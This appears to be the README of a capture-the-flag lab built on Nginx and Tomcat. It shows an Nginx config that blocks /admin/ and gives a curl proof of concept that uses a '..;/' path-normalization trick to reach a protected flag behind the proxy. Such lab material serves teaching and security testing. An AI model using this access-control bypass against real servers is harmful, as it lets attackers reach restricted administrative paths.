### Nginx + Tomcat

Try to access http://backend:8080/admin/flag


### Usage
Build and run
```
docker-compose up
```

Go http://127.0.0.1:8081/


### Hint
Nginx default.conf
```
location / {
    proxy_pass	http://backend:8080/;
}

location ^~ /admin/ {
    deny all;
    return 403;
}
```

### POC
``` bash
curl --path-as-is 'http://127.0.0.1:8081/..;/console;/flag'
```